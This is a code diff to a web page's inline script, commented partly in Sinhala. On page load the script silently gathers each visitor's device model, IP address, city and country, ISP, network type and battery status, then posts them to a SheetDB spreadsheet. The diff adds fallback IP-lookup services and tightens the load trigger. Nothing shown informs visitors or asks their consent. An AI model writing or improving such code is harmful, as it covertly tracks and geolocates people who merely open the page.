@@ -317,14 +317,14 @@
    //     sheet db
 async function sendToSheetDB() {
     try {
-    
+        // 1. Device Model එක සොයාගැනීම
         async function getExactDeviceName() {
             let ua = navigator.userAgent;
 
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
                     let uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                    if (uaData.model) return uaData.model;
+                    if (uaData.model && uaData.model !== "") return uaData.model;
                 } catch (e) {
                     console.log("UA Data error:", e);
                 }
@@ -357,23 +357,37 @@ async function sendToSheetDB() {
 
         let deviceName = await getExactDeviceName();
 
-        
-        let ipData = {};
+        // 2. HTTPS සපයන IP API එකකින් IP & Location ලබාගැනීම
+        let ipAddress = "Unknown";
+        let location = "Unknown";
+        let isp = "Unknown";
+
         try {
-            let res = await fetch('https://ip-api.com/json/?fields=status,country,city,isp,query');
-            let result = await res.json();
-            if (result.status === "success") {
-                ipData = result;
+            let res = await fetch('https://ipwho.is/');
+            let ipData = await res.json();
+            if (ipData.success) {
+                ipAddress = ipData.ip || "Unknown";
+                location = (ipData.city && ipData.country) ? `${ipData.city}, ${ipData.country}` : "Unknown";
+                isp = ipData.connection ? ipData.connection.isp : (ipData.isp || "Unknown");
             }
         } catch (e) {
-            console.log("IP fetch error:", e);
+            // Backup API
+            try {
+                let res2 = await fetch('https://ipapi.co/json/');
+                let ipData2 = await res2.json();
+                ipAddress = ipData2.ip || "Unknown";
+                location = (ipData2.city && ipData2.country_name) ? `${ipData2.city}, ${ipData2.country_name}` : "Unknown";
+                isp = ipData2.org || "Unknown";
+            } catch (err) {
+                console.log("IP API error:", err);
+            }
         }
 
+        // 3. Network & Battery
         let connection = navigator.connection || {};
-
-        // Battery Info
         let batteryLevel = "Unknown";
         let isCharging = "Unknown";
+
         if (navigator.getBattery) {
             try {
                 let battery = await navigator.getBattery();
@@ -384,11 +398,12 @@ async function sendToSheetDB() {
             }
         }
 
+        // 4. Data Object
         let data = {
             "device_model": deviceName,
-            "ip": ipData.query || "Unknown",
-            "location": (ipData.city && ipData.country) ? `${ipData.city}, ${ipData.country}` : "Unknown",
-            "isp": ipData.isp || "Unknown",
+            "ip": ipAddress,
+            "location": location,
+            "isp": isp,
             "network_type": connection.effectiveType || "Unknown",
             "battery_level": batteryLevel,
             "charging_status": isCharging,
@@ -405,7 +420,7 @@ async function sendToSheetDB() {
             "time": new Date().toLocaleString()
         };
 
-       
+        // 5. SheetDB එකට දත්ත යැවීම
         await fetch("https://sheetdb.io/api/v1/af0463c53ob1m", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -417,9 +432,12 @@ async function sendToSheetDB() {
     }
 }
 
-window.addEventListener('DOMContentLoaded', () => {
+// Page එක Load වූ පසු එකපාරක් පමණක් Run වීම
+if (document.readyState === 'complete') {
     sendToSheetDB();
-});
+} else {
+    window.addEventListener('load', sendToSheetDB);
+}
     </script>
 </body>
     </html>
